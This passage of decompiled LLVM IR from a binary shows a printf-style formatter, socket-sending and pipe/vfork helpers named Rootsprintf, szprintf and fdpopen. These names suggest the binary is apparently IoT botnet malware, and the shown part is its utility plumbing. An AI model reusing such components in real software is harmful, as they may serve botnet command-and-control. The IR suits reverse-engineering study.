  %stack_var_-68.0.ph = phi i8* [ %v5_10000a40, %dec_label_pc_10000a7c ], [ %v5_10000a98, %dec_label_pc_10000a90 ]
  %stack_var_-52.0.ph = phi i32 [ 0, %dec_label_pc_10000a7c ], [ 1, %dec_label_pc_10000a90 ]
  %v4_10000ac03 = ptrtoint i8* %stack_var_-68.0.ph to i32
  %v2_10000ac44 = load i8, i8* %stack_var_-68.0.ph, align 1
  %v3_10000acc8 = icmp eq i8 %v2_10000ac44, 48
  br i1 %v3_10000acc8, label %dec_label_pc_10000aa8, label %dec_label_pc_10000b0c.preheader

dec_label_pc_10000aa8:                            ; preds = %dec_label_pc_10000ac0.preheader, %dec_label_pc_10000aa8
  %v4_10000ac010 = phi i32 [ %v1_10000aac, %dec_label_pc_10000aa8 ], [ %v4_10000ac03, %dec_label_pc_10000ac0.preheader ]
  %stack_var_-52.09 = phi i32 [ %v1_10000ab8, %dec_label_pc_10000aa8 ], [ %stack_var_-52.0.ph, %dec_label_pc_10000ac0.preheader ]
  %v1_10000aac = add i32 %v4_10000ac010, 1
  %v5_10000ab0 = inttoptr i32 %v1_10000aac to i8*
  %v1_10000ab8 = or i32 %stack_var_-52.09, 2
  %v2_10000ac4 = load i8, i8* %v5_10000ab0, align 1
  %v3_10000acc = icmp eq i8 %v2_10000ac4, 48
  br i1 %v3_10000acc, label %dec_label_pc_10000aa8, label %dec_label_pc_10000b0c.preheader

dec_label_pc_10000b0c.preheader:                  ; preds = %dec_label_pc_10000aa8, %dec_label_pc_10000ac0.preheader
  %stack_var_-52.0.lcssa = phi i32 [ %stack_var_-52.0.ph, %dec_label_pc_10000ac0.preheader ], [ %v1_10000ab8, %dec_label_pc_10000aa8 ]
  %stack_var_-68.0.lcssa = phi i8* [ %stack_var_-68.0.ph, %dec_label_pc_10000ac0.preheader ], [ %v5_10000ab0, %dec_label_pc_10000aa8 ]
  %v4_10000b0c12 = ptrtoint i8* %stack_var_-68.0.lcssa to i32
  %v2_10000b1013 = load i8, i8* %stack_var_-68.0.lcssa, align 1
  %tmp62 = icmp ult i8 %v2_10000b1013, 48
  br i1 %tmp62, label %dec_label_pc_10000b34, label %dec_label_pc_10000b20

dec_label_pc_10000ad8:                            ; preds = %dec_label_pc_10000b20
  %v1_10000adc = mul i32 %stack_var_-48.018, 10
  %v2_10000ae8 = load i8, i8* %stack_var_-68.119, align 1
  %v3_10000ae8 = zext i8 %v2_10000ae8 to i32
  %v2_10000af4 = add i32 %v1_10000adc, -48
  %v1_10000af8 = add i32 %v2_10000af4, %v3_10000ae8
  %v1_10000b04 = add i32 %v4_10000b0c20, 1
  %v5_10000b08 = inttoptr i32 %v1_10000b04 to i8*
  %v2_10000b10 = load i8, i8* %v5_10000b08, align 1
  %tmp63 = icmp ult i8 %v2_10000b10, 48
  br i1 %tmp63, label %dec_label_pc_10000b34, label %dec_label_pc_10000b20

dec_label_pc_10000b20:                            ; preds = %dec_label_pc_10000b0c.preheader, %dec_label_pc_10000ad8
  %v4_10000b0c20 = phi i32 [ %v1_10000b04, %dec_label_pc_10000ad8 ], [ %v4_10000b0c12, %dec_label_pc_10000b0c.preheader ]
  %stack_var_-68.119 = phi i8* [ %v5_10000b08, %dec_label_pc_10000ad8 ], [ %stack_var_-68.0.lcssa, %dec_label_pc_10000b0c.preheader ]
  %stack_var_-48.018 = phi i32 [ %v1_10000af8, %dec_label_pc_10000ad8 ], [ 0, %dec_label_pc_10000b0c.preheader ]
  %v2_10000b24 = load i8, i8* %stack_var_-68.119, align 1
  %tmp64 = icmp ult i8 %v2_10000b24, 58
  br i1 %tmp64, label %dec_label_pc_10000ad8, label %dec_label_pc_10000b34

dec_label_pc_10000b34:                            ; preds = %dec_label_pc_10000ad8, %dec_label_pc_10000b20, %dec_label_pc_10000b0c.preheader
  %stack_var_-48.0.lcssa = phi i32 [ 0, %dec_label_pc_10000b0c.preheader ], [ %v1_10000af8, %dec_label_pc_10000ad8 ], [ %stack_var_-48.018, %dec_label_pc_10000b20 ]
  %stack_var_-68.1.lcssa = phi i8* [ %stack_var_-68.0.lcssa, %dec_label_pc_10000b0c.preheader ], [ %v5_10000b08, %dec_label_pc_10000ad8 ], [ %stack_var_-68.119, %dec_label_pc_10000b20 ]
  %v2_10000b38 = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_10000b40 = icmp eq i8 %v2_10000b38, 115
  br i1 %v3_10000b40, label %dec_label_pc_10000b48, label %dec_label_pc_10000c08

dec_label_pc_10000b48:                            ; preds = %dec_label_pc_10000b34
  %v2_10000b4c = load i8, i8* %tmp, align 1
  %tmp65 = icmp ugt i8 %v2_10000b4c, 7
  br i1 %tmp65, label %dec_label_pc_10000b94, label %dec_label_pc_10000b5c

dec_label_pc_10000b5c:                            ; preds = %dec_label_pc_10000b48
  %v3_10000b60 = load i32, i32* %v2_10000b60, align 4
  %v2_10000b68 = load i8, i8* %tmp, align 1
  %v3_10000b68 = zext i8 %v2_10000b68 to i32
  %v1_10000b74 = mul nuw nsw i32 %v3_10000b68, 4
  %v2_10000b78 = add i32 %v1_10000b74, %v3_10000b60
  %v1_10000b80 = add i8 %v2_10000b68, 1
  store i8 %v1_10000b80, i8* %tmp, align 1
  br label %dec_label_pc_10000bac

dec_label_pc_10000b94:                            ; preds = %dec_label_pc_10000b48
  %v3_10000b98 = load i32, i32* %v2_10000b98, align 4
  %v1_10000ba0 = add i32 %v3_10000b98, 4
  store i32 %v1_10000ba0, i32* %v2_10000b98, align 4
  br label %dec_label_pc_10000bac

dec_label_pc_10000bac:                            ; preds = %dec_label_pc_10000b5c, %dec_label_pc_10000b94
  %stack_var_-20.0 = phi i32 [ %v3_10000b98, %dec_label_pc_10000b94 ], [ %v2_10000b78, %dec_label_pc_10000b5c ]
  %v1_10000bb0 = inttoptr i32 %stack_var_-20.0 to i32*
  %v2_10000bb0 = load i32, i32* %v1_10000bb0, align 4
  %v3_10000bbc = icmp eq i32 %v2_10000bb0, 0
  br i1 %v3_10000bbc, label %dec_label_pc_10000bd0, label %dec_label_pc_10000bc4

dec_label_pc_10000bc4:                            ; preds = %dec_label_pc_10000bac
  %v5_10000bc8 = inttoptr i32 %v2_10000bb0 to i8*
  br label %dec_label_pc_10000bdc

dec_label_pc_10000bd0:                            ; preds = %dec_label_pc_10000bac
  br label %dec_label_pc_10000bdc

dec_label_pc_10000bdc:                            ; preds = %dec_label_pc_10000bc4, %dec_label_pc_10000bd0
  %storemerge = phi i8* [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10011880.15, i32 0, i32 0), %dec_label_pc_10000bd0 ], [ %v5_10000bc8, %dec_label_pc_10000bc4 ]
  %v6_10000bf0 = call i32 @prints(i32 %tmp41, i8* %storemerge, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa)
  %v2_10000bfc = add i32 %v6_10000bf0, %stack_var_-56.132
  br label %dec_label_pc_10000fb8

dec_label_pc_10000c08:                            ; preds = %dec_label_pc_10000b34
  %v2_10000c0c = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_10000c14 = icmp eq i8 %v2_10000c0c, 100
  br i1 %v3_10000c14, label %dec_label_pc_10000c1c, label %dec_label_pc_10000cbc

dec_label_pc_10000c1c:                            ; preds = %dec_label_pc_10000c08
  %v2_10000c20 = load i8, i8* %tmp, align 1
  %tmp66 = icmp ugt i8 %v2_10000c20, 7
  br i1 %tmp66, label %dec_label_pc_10000c68, label %dec_label_pc_10000c30

dec_label_pc_10000c30:                            ; preds = %dec_label_pc_10000c1c
  %v3_10000c34 = load i32, i32* %v2_10000b60, align 4
  %v2_10000c3c = load i8, i8* %tmp, align 1
  %v3_10000c3c = zext i8 %v2_10000c3c to i32
  %v1_10000c48 = mul nuw nsw i32 %v3_10000c3c, 4
  %v2_10000c4c = add i32 %v1_10000c48, %v3_10000c34
  %v1_10000c54 = add i8 %v2_10000c3c, 1
  store i8 %v1_10000c54, i8* %tmp, align 1
  br label %dec_label_pc_10000c80

dec_label_pc_10000c68:                            ; preds = %dec_label_pc_10000c1c
  %v3_10000c6c = load i32, i32* %v2_10000b98, align 4
  %v1_10000c74 = add i32 %v3_10000c6c, 4
  store i32 %v1_10000c74, i32* %v2_10000b98, align 4
  br label %dec_label_pc_10000c80

dec_label_pc_10000c80:                            ; preds = %dec_label_pc_10000c30, %dec_label_pc_10000c68
  %stack_var_-28.0 = phi i32 [ %v3_10000c6c, %dec_label_pc_10000c68 ], [ %v2_10000c4c, %dec_label_pc_10000c30 ]
  %v1_10000c84 = inttoptr i32 %stack_var_-28.0 to i32*
  %v2_10000c84 = load i32, i32* %v1_10000c84, align 4
  %v7_10000ca4 = call i32 @printi(i32 %tmp41, i32 %v2_10000c84, i32 10, i32 1, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa, i32 97)
  %v2_10000cb0 = add i32 %v7_10000ca4, %stack_var_-56.132
  br label %dec_label_pc_10000fb8

dec_label_pc_10000cbc:                            ; preds = %dec_label_pc_10000c08
  %v2_10000cc0 = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_10000cc8 = icmp eq i8 %v2_10000cc0, 120
  br i1 %v3_10000cc8, label %dec_label_pc_10000cd0, label %dec_label_pc_10000d70

dec_label_pc_10000cd0:                            ; preds = %dec_label_pc_10000cbc
  %v2_10000cd4 = load i8, i8* %tmp, align 1
  %tmp67 = icmp ugt i8 %v2_10000cd4, 7
  br i1 %tmp67, label %dec_label_pc_10000d1c, label %dec_label_pc_10000ce4

dec_label_pc_10000ce4:                            ; preds = %dec_label_pc_10000cd0
  %v3_10000ce8 = load i32, i32* %v2_10000b60, align 4
  %v2_10000cf0 = load i8, i8* %tmp, align 1
  %v3_10000cf0 = zext i8 %v2_10000cf0 to i32
  %v1_10000cfc = mul nuw nsw i32 %v3_10000cf0, 4
  %v2_10000d00 = add i32 %v1_10000cfc, %v3_10000ce8
  %v1_10000d08 = add i8 %v2_10000cf0, 1
  store i8 %v1_10000d08, i8* %tmp, align 1
  br label %dec_label_pc_10000d34

dec_label_pc_10000d1c:                            ; preds = %dec_label_pc_10000cd0
  %v3_10000d20 = load i32, i32* %v2_10000b98, align 4
  %v1_10000d28 = add i32 %v3_10000d20, 4
  store i32 %v1_10000d28, i32* %v2_10000b98, align 4
  br label %dec_label_pc_10000d34

dec_label_pc_10000d34:                            ; preds = %dec_label_pc_10000ce4, %dec_label_pc_10000d1c
  %stack_var_-32.0 = phi i32 [ %v3_10000d20, %dec_label_pc_10000d1c ], [ %v2_10000d00, %dec_label_pc_10000ce4 ]
  %v1_10000d38 = inttoptr i32 %stack_var_-32.0 to i32*
  %v2_10000d38 = load i32, i32* %v1_10000d38, align 4
  %v7_10000d58 = call i32 @printi(i32 %tmp41, i32 %v2_10000d38, i32 16, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa, i32 97)
  %v2_10000d64 = add i32 %v7_10000d58, %stack_var_-56.132
  br label %dec_label_pc_10000fb8

dec_label_pc_10000d70:                            ; preds = %dec_label_pc_10000cbc
  %v2_10000d74 = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_10000d7c = icmp eq i8 %v2_10000d74, 88
  br i1 %v3_10000d7c, label %dec_label_pc_10000d84, label %dec_label_pc_10000e24

dec_label_pc_10000d84:                            ; preds = %dec_label_pc_10000d70
  %v2_10000d88 = load i8, i8* %tmp, align 1
  %tmp68 = icmp ugt i8 %v2_10000d88, 7
  br i1 %tmp68, label %dec_label_pc_10000dd0, label %dec_label_pc_10000d98

dec_label_pc_10000d98:                            ; preds = %dec_label_pc_10000d84
  %v3_10000d9c = load i32, i32* %v2_10000b60, align 4
  %v2_10000da4 = load i8, i8* %tmp, align 1
  %v3_10000da4 = zext i8 %v2_10000da4 to i32
  %v1_10000db0 = mul nuw nsw i32 %v3_10000da4, 4
  %v2_10000db4 = add i32 %v1_10000db0, %v3_10000d9c
  %v1_10000dbc = add i8 %v2_10000da4, 1
  store i8 %v1_10000dbc, i8* %tmp, align 1
  br label %dec_label_pc_10000de8

dec_label_pc_10000dd0:                            ; preds = %dec_label_pc_10000d84
  %v3_10000dd4 = load i32, i32* %v2_10000b98, align 4
  %v1_10000ddc = add i32 %v3_10000dd4, 4
  store i32 %v1_10000ddc, i32* %v2_10000b98, align 4
  br label %dec_label_pc_10000de8

dec_label_pc_10000de8:                            ; preds = %dec_label_pc_10000d98, %dec_label_pc_10000dd0
  %stack_var_-36.0 = phi i32 [ %v3_10000dd4, %dec_label_pc_10000dd0 ], [ %v2_10000db4, %dec_label_pc_10000d98 ]
  %v1_10000dec = inttoptr i32 %stack_var_-36.0 to i32*
  %v2_10000dec = load i32, i32* %v1_10000dec, align 4
  %v7_10000e0c = call i32 @printi(i32 %tmp41, i32 %v2_10000dec, i32 16, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa, i32 65)
  %v2_10000e18 = add i32 %v7_10000e0c, %stack_var_-56.132
  br label %dec_label_pc_10000fb8

dec_label_pc_10000e24:                            ; preds = %dec_label_pc_10000d70
  %v2_10000e28 = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_10000e30 = icmp eq i8 %v2_10000e28, 117
  br i1 %v3_10000e30, label %dec_label_pc_10000e38, label %dec_label_pc_10000ed8

dec_label_pc_10000e38:                            ; preds = %dec_label_pc_10000e24
  %v2_10000e3c = load i8, i8* %tmp, align 1
  %tmp69 = icmp ugt i8 %v2_10000e3c, 7
  br i1 %tmp69, label %dec_label_pc_10000e84, label %dec_label_pc_10000e4c

dec_label_pc_10000e4c:                            ; preds = %dec_label_pc_10000e38
  %v3_10000e50 = load i32, i32* %v2_10000b60, align 4
  %v2_10000e58 = load i8, i8* %tmp, align 1
  %v3_10000e58 = zext i8 %v2_10000e58 to i32
  %v1_10000e64 = mul nuw nsw i32 %v3_10000e58, 4
  %v2_10000e68 = add i32 %v1_10000e64, %v3_10000e50
  %v1_10000e70 = add i8 %v2_10000e58, 1
  store i8 %v1_10000e70, i8* %tmp, align 1
  br label %dec_label_pc_10000e9c

dec_label_pc_10000e84:                            ; preds = %dec_label_pc_10000e38
  %v3_10000e88 = load i32, i32* %v2_10000b98, align 4
  %v1_10000e90 = add i32 %v3_10000e88, 4
  store i32 %v1_10000e90, i32* %v2_10000b98, align 4
  br label %dec_label_pc_10000e9c

dec_label_pc_10000e9c:                            ; preds = %dec_label_pc_10000e4c, %dec_label_pc_10000e84
  %stack_var_-40.0 = phi i32 [ %v3_10000e88, %dec_label_pc_10000e84 ], [ %v2_10000e68, %dec_label_pc_10000e4c ]
  %v1_10000ea0 = inttoptr i32 %stack_var_-40.0 to i32*
  %v2_10000ea0 = load i32, i32* %v1_10000ea0, align 4
  %v7_10000ec0 = call i32 @printi(i32 %tmp41, i32 %v2_10000ea0, i32 10, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa, i32 97)
  %v2_10000ecc = add i32 %v7_10000ec0, %stack_var_-56.132
  br label %dec_label_pc_10000fb8

dec_label_pc_10000ed8:                            ; preds = %dec_label_pc_10000e24
  %v2_10000edc = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_10000ee4 = icmp eq i8 %v2_10000edc, 99
  br i1 %v3_10000ee4, label %dec_label_pc_10000eec, label %dec_label_pc_10000fb8

dec_label_pc_10000eec:                            ; preds = %dec_label_pc_10000ed8
  %v2_10000ef0 = load i8, i8* %tmp, align 1
  %tmp70 = icmp ugt i8 %v2_10000ef0, 7
  br i1 %tmp70, label %dec_label_pc_10000f38, label %dec_label_pc_10000f00

dec_label_pc_10000f00:                            ; preds = %dec_label_pc_10000eec
  %v3_10000f04 = load i32, i32* %v2_10000b60, align 4
  %v2_10000f0c = load i8, i8* %tmp, align 1
  %v3_10000f0c = zext i8 %v2_10000f0c to i32
  %v1_10000f18 = mul nuw nsw i32 %v3_10000f0c, 4
  %v2_10000f1c = add i32 %v1_10000f18, %v3_10000f04
  %v1_10000f24 = add i8 %v2_10000f0c, 1
  store i8 %v1_10000f24, i8* %tmp, align 1
  br label %dec_label_pc_10000f50

dec_label_pc_10000f38:                            ; preds = %dec_label_pc_10000eec
  %v3_10000f3c = load i32, i32* %v2_10000b98, align 4
  %v1_10000f44 = add i32 %v3_10000f3c, 4
  store i32 %v1_10000f44, i32* %v2_10000b98, align 4
  br label %dec_label_pc_10000f50

dec_label_pc_10000f50:                            ; preds = %dec_label_pc_10000f00, %dec_label_pc_10000f38
  %stack_var_-44.0 = phi i32 [ %v3_10000f3c, %dec_label_pc_10000f38 ], [ %v2_10000f1c, %dec_label_pc_10000f00 ]
  %v1_10000f54 = inttoptr i32 %stack_var_-44.0 to i32*
  %v2_10000f54 = load i32, i32* %v1_10000f54, align 4
  %v1_10000f58 = urem i32 %v2_10000f54, 256
  store i32 %v1_10000f58, i32* %stack_var_-88, align 4
  %v5_10000f7c = call i32 @prints(i32 %tmp41, i8* %v4_10000f7c, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa)
  %v2_10000f88 = add i32 %v5_10000f7c, %stack_var_-56.132
  br label %dec_label_pc_10000fb8

dec_label_pc_10000f94:                            ; preds = %dec_label_pc_10000a24, %dec_label_pc_10000a68
  %stack_var_-68.2 = phi i8* [ %v5_10000a40, %dec_label_pc_10000a68 ], [ %stack_var_-68.434, %dec_label_pc_10000a24 ]
  %v2_10000f98 = load i8, i8* %stack_var_-68.2, align 1
  %v3_10000f98 = zext i8 %v2_10000f98 to i32
  %v3_10000fa8 = call i32 @printchar(i32* %arg1, i32 %v3_10000f98)
  %v1_10000fb0 = add i32 %stack_var_-56.132, 1
  br label %dec_label_pc_10000fb8

dec_label_pc_10000fb8:                            ; preds = %dec_label_pc_10000ed8, %dec_label_pc_10000f50, %dec_label_pc_10000e9c, %dec_label_pc_10000de8, %dec_label_pc_10000d34, %dec_label_pc_10000c80, %dec_label_pc_10000bdc, %dec_label_pc_10000f94
  %stack_var_-56.0 = phi i32 [ %v1_10000fb0, %dec_label_pc_10000f94 ], [ %v2_10000bfc, %dec_label_pc_10000bdc ], [ %v2_10000cb0, %dec_label_pc_10000c80 ], [ %v2_10000d64, %dec_label_pc_10000d34 ], [ %v2_10000e18, %dec_label_pc_10000de8 ], [ %v2_10000ecc, %dec_label_pc_10000e9c ], [ %v2_10000f88, %dec_label_pc_10000f50 ], [ %stack_var_-56.132, %dec_label_pc_10000ed8 ]
  %stack_var_-68.3 = phi i8* [ %stack_var_-68.2, %dec_label_pc_10000f94 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10000bdc ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10000c80 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10000d34 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10000de8 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10000e9c ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10000f50 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10000ed8 ]
  %v4_10000fb8 = ptrtoint i8* %stack_var_-68.3 to i32
  %v1_10000fbc = add i32 %v4_10000fb8, 1
  %stack_var_-68.4 = inttoptr i32 %v1_10000fbc to i8*
  %v2_10000fc8 = load i8, i8* %stack_var_-68.4, align 1
  %v3_10000fd0 = icmp eq i8 %v2_10000fc8, 0
  br i1 %v3_10000fd0, label %dec_label_pc_10000fd8, label %dec_label_pc_10000a24

dec_label_pc_10000fd8:                            ; preds = %dec_label_pc_10000a38, %dec_label_pc_10000fb8, %entry
  %stack_var_-56.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-56.132, %dec_label_pc_10000a38 ], [ %stack_var_-56.0, %dec_label_pc_10000fb8 ]
  %v3_10000fdc = icmp eq i32* %arg1, null
  br i1 %v3_10000fdc, label %dec_label_pc_10000ff4, label %dec_label_pc_10000fe4

dec_label_pc_10000fe4:                            ; preds = %dec_label_pc_10000fd8
  %v2_10000fe8 = load i32, i32* %arg1, align 4
  %v3_10000ff0 = inttoptr i32 %v2_10000fe8 to i8*
  store i8 0, i8* %v3_10000ff0, align 1
  br label %dec_label_pc_10000ff4

dec_label_pc_10000ff4:                            ; preds = %dec_label_pc_10000fd8, %dec_label_pc_10000fe4
  ret i32 %stack_var_-56.1.lcssa

; uselistorder directives
  uselistorder i8* %stack_var_-68.4, { 1, 0 }
  uselistorder i8* %stack_var_-68.1.lcssa, { 12, 11, 9, 7, 5, 3, 1, 10, 8, 6, 4, 2, 0 }
  uselistorder i32 %stack_var_-48.0.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i8* %stack_var_-68.0.lcssa, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-52.0.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_10000aac, { 1, 0 }
  uselistorder i32 %stack_var_-52.0.ph, { 1, 0 }
  uselistorder i8* %v5_10000a40, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_-56.132, { 0, 8, 7, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 %stack_var_-68.4.in33, { 1, 0 }
  uselistorder i32* %v2_10000b98, { 1, 0, 3, 2, 5, 4, 7, 6, 9, 8, 10, 11 }
  uselistorder i32* %stack_var_-88, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @printi, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i8*, i32, i32)* @prints, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_10000ff4, { 1, 0 }
  uselistorder label %dec_label_pc_10000fd8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10000fb8, { 7, 1, 0, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_10000f94, { 1, 0 }
  uselistorder label %dec_label_pc_10000f50, { 1, 0 }
  uselistorder label %dec_label_pc_10000e9c, { 1, 0 }
  uselistorder label %dec_label_pc_10000de8, { 1, 0 }
  uselistorder label %dec_label_pc_10000d34, { 1, 0 }
  uselistorder label %dec_label_pc_10000c80, { 1, 0 }
  uselistorder label %dec_label_pc_10000bdc, { 1, 0 }
  uselistorder label %dec_label_pc_10000bac, { 1, 0 }
  uselistorder label %dec_label_pc_10000b34, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10000b20, { 1, 0 }
  uselistorder label %dec_label_pc_10000aa8, { 1, 0 }
  uselistorder label %dec_label_pc_10000a24, { 1, 0 }
}

define i32 @zprintf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-136 = alloca i32, align 4
  store i32 1, i32* %stack_var_-136, align 4
  %v2_10001094 = ptrtoint i32* %stack_var_-136 to i32
  store i32 268439712, i32* @lr, align 4
  %v4_1000109c = call i32 @print(i32* null, i32 %arg1, i32 %v2_10001094)
  ret i32 %v4_1000109c

; uselistorder directives
  uselistorder i32* %stack_var_-136, { 1, 0 }
}

define i32 @szprintf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-120, align 4
  store i32 2, i32* %stack_var_-136, align 4
  %v2_10001144 = ptrtoint i32* %stack_var_-136 to i32
  store i32 268439888, i32* @lr, align 4
  %v4_1000114c = call i32 @print(i32* nonnull %stack_var_-120, i32 %arg2, i32 %v2_10001144)
  ret i32 %v4_1000114c

; uselistorder directives
  uselistorder i32* %stack_var_-136, { 1, 0 }
}

define i32 @Rootsprintf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  store i32 2048, i32* @r3, align 4
  store i32 268440016, i32* @lr, align 4
  %v0_100011cc = call i32 @malloc()
  store i32 %v0_100011cc, i32* %stack_var_-144, align 4
  store i32 268440048, i32* @lr, align 4
  %v3_100011ec = call i32 @__GI_memset(i32 %v0_100011cc, i32 0, i32 2048)
  store i32 2, i32* %stack_var_-140, align 4
  %v2_10001220 = ptrtoint i32* %stack_var_-140 to i32
  store i32 268440116, i32* @lr, align 4
  %v4_10001230 = call i32 @print(i32* nonnull %stack_var_-144, i32 %arg2, i32 %v2_10001220)
  store i32 %v0_100011cc, i32* @r3, align 4
  %v0_10001238 = call i32 @__GI_strlen()
  %v2_10001248 = add i32 %v0_10001238, %v0_100011cc
  %v3_10001250 = inttoptr i32 %v2_10001248 to i8*
  store i8 10, i8* %v3_10001250, align 1
  store i32 %v0_100011cc, i32* @r3, align 4
  %v0_10001258 = call i32 @__GI_strlen()
  store i32 268440180, i32* @lr, align 4
  %v4_10001270 = call i32 @__libc_send(i32 %arg1, i32 %v0_100011cc, i32 %v0_10001258, i32 16384)
  store i32 %v0_100011cc, i32* @r3, align 4
  store i32 268440196, i32* @lr, align 4
  %v0_10001280 = call i32 @free()
  ret i32 %v4_10001270

; uselistorder directives
  uselistorder i32 %v0_100011cc, { 1, 4, 2, 0, 3, 5, 6 }
  uselistorder i32* %stack_var_-140, { 1, 0 }
}

define i32 @fdpopen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-48 = alloca i32, align 4
  %v2_100012c4 = load i8, i8* %arg2, align 1
  %v3_100012cc = icmp eq i8 %v2_100012c4, 114
  br i1 %v3_100012cc, label %dec_label_pc_100012e8, label %dec_label_pc_100012d4

dec_label_pc_100012d4:                            ; preds = %entry
  %v2_100012d8 = load i8, i8* %arg2, align 1
  %v3_100012e0 = icmp eq i8 %v2_100012d8, 119
  br i1 %v3_100012e0, label %dec_label_pc_100012e8, label %dec_label_pc_10001300

dec_label_pc_100012e8:                            ; preds = %dec_label_pc_100012d4, %entry
  %v1_100012ec = add i32 %tmp, 1
  %v2_100012ec = inttoptr i32 %v1_100012ec to i8*
  %v3_100012f0 = load i8, i8* %v2_100012ec, align 1
  %v3_100012f8 = icmp eq i8 %v3_100012f0, 0
  br i1 %v3_100012f8, label %dec_label_pc_1000130c, label %dec_label_pc_10001300

dec_label_pc_10001300:                            ; preds = %dec_label_pc_100012d4, %dec_label_pc_100012e8
  br label %dec_label_pc_10001530

dec_label_pc_1000130c:                            ; preds = %dec_label_pc_100012e8
  %v2_1000130c = ptrtoint i32* %stack_var_-48 to i32
  store i32 268440344, i32* @lr, align 4
  %v3_10001314 = call i32 @__GI_pipe(i32 %v2_1000130c, i32 %v1_100012ec)
  store i32 %v3_10001314, i32* @r3, align 4
  %tmp15 = icmp sgt i32 %v3_10001314, -1
  br i1 %tmp15, label %dec_label_pc_10001330, label %dec_label_pc_10001324

dec_label_pc_10001324:                            ; preds = %dec_label_pc_1000130c
  br label %dec_label_pc_10001530

dec_label_pc_10001330:                            ; preds = %dec_label_pc_1000130c
  %v3_10001334 = load i32, i32* @global_var_10024a4c.16, align 4
  %v3_10001338 = icmp eq i32 %v3_10001334, 0
  br i1 %v3_10001338, label %dec_label_pc_10001340, label %dec_label_pc_100013c0

dec_label_pc_10001340:                            ; preds = %dec_label_pc_10001330
  store i32 268440388, i32* @lr, align 4
  %v1_10001340 = call i32 @getdtablesize(i32 268566528)
  %v2_10001350 = icmp sgt i32 %v1_10001340, 0
  br i1 %v2_10001350, label %dec_label_pc_10001364, label %dec_label_pc_10001358

dec_label_pc_10001358:                            ; preds = %dec_label_pc_10001340
  br label %dec_label_pc_10001530

dec_label_pc_10001364:                            ; preds = %dec_label_pc_10001340
  %v1_10001368 = mul i32 %v1_10001340, 4
  store i32 %v1_10001368, i32* @r3, align 4
  store i32 268440436, i32* @lr, align 4
  %v0_10001370 = call i32 @malloc()
  store i32 %v0_10001370, i32* @global_var_10024a4c.16, align 4
  %v3_10001388 = icmp eq i32 %v0_10001370, 0
  br i1 %v3_10001388, label %dec_label_pc_10001390, label %dec_label_pc_1000139c

dec_label_pc_10001390:                            ; preds = %dec_label_pc_10001364
  br label %dec_label_pc_10001530

dec_label_pc_1000139c:                            ; preds = %dec_label_pc_10001364
  store i32 ptrtoint (i32* @global_var_100013c0.17 to i32), i32* @lr, align 4
  %v3_100013bc = call i32 @__GI_memset(i32 %v0_10001370, i32 0, i32 %v1_10001368)
  store i32 %v3_100013bc, i32* @r3, align 4
  br label %dec_label_pc_100013c0

dec_label_pc_100013c0:                            ; preds = %dec_label_pc_10001330, %dec_label_pc_1000139c
  store i32 268440516, i32* @lr, align 4
  %v0_100013c0 = call i32 @__vfork()
  %v4_100013dc = icmp eq i32 %v0_100013c0, -1
  br i1 %v4_100013dc, label %dec_label_pc_100013f4, label %dec_label_pc_100013e4

dec_label_pc_100013e4:                            ; preds = %dec_label_pc_100013c0
  %v3_100013e8 = icmp eq i32 %v0_100013c0, 0
  br i1 %v3_100013e8, label %dec_label_pc_10001418, label %dec_label_pc_100014c8

dec_label_pc_100013f4:                            ; preds = %dec_label_pc_100013c0
  %v3_100013f4 = load i32, i32* %stack_var_-48, align 4
  store i32 268440576, i32* @lr, align 4
  %v1_100013fc = call i32 @__libc_close(i32 %v3_100013f4)
  store i32 ptrtoint (i32* @global_var_1000140c.18 to i32), i32* @lr, align 4
  %v1_10001408 = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_10001530

dec_label_pc_10001418:                            ; preds = %dec_label_pc_100013e4
  %v3_1000141c = load i8, i8* %arg2, align 1
  %v3_10001424 = icmp eq i8 %v3_1000141c, 114
  br i1 %v3_10001424, label %dec_label_pc_1000142c, label %dec_label_pc_10001464

dec_label_pc_1000142c:                            ; preds = %dec_label_pc_10001418
  %v3_10001430 = icmp eq i32 %tmp3, 1
